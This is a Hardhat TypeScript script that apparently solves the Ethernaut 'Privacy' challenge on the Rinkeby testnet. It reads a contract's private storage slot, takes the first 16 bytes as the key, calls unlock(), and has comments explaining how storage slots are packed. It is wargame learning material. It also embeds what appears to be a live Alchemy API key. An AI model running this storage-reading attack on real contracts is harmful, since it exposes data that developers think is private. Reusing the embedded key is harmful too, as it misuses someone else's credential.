import { artifacts, ethers } from "hardhat";
import { deployContract } from "../../utils/deployContract";
import { abi } from "../../artifacts/contracts/12.Privacy/Privacy.sol/Privacy.json";
import { BigNumber, Contract } from "ethers";
import { displayEthBalance } from "../../utils/displayEthBalance";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";

function setTargetContract() {
  const contractAddress = "0x3D81f0175F85B453b2F9eB4EC5E03B52a3E0C8f3";
  return new Contract(contractAddress, abi);
}

async function checkSucces(attacker: SignerWithAddress, target: Contract) {
  const response = await attacker.provider!.getStorageAt(target.address, "0x0");
  console.log("Success:", parseInt(response, 16) === 0);
}

async function main() {
  // const targetAddr = "0xBEdd2Bca152E2c7E55645CD7d585cd313FacbDF2";
  const privacy = setTargetContract();
  const [attacker] = await ethers.getSigners();

  const provider = new ethers.providers.JsonRpcProvider(
    "https://eth-rinkeby.alchemyapi.io/v2/TMfNFHkOWc5WIHWdkvGGWlmALUJmSW1v"
  );
  const slot5 = await provider.getStorageAt(privacy.address, "0x5");
  const key = slot5.slice(0, 34);
  const tx = await privacy.connect(attacker).unlock(key);
  await tx.wait();

  checkSucces(attacker, privacy);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});

// explanation:
// Data are organized by 256 bit packages. But to avoid loss of space, data are sometimes
// gathered.
// In this case the data is organised this way :
// slot[0] = 0x0000000000000000000000000000000000000000000000000000000000000000
//  --> locked variable
// slot[1] = 0x0000000000000000000000000000000000000000000000000000000062bcd019
// --> ID variable
// slot[2] = 0x00000000000000000000000000000000000000000000000000000000d019ff0a
// --> 0a = 10 = flattening variable
// --> ff = 255 = denomination
// --> d019 = 53407 = uint16(now)
// slot[3] = data[0]
// slot[4] = data[1]
// slot[5] = data[2]
// So solution is bytes16(slot[5])
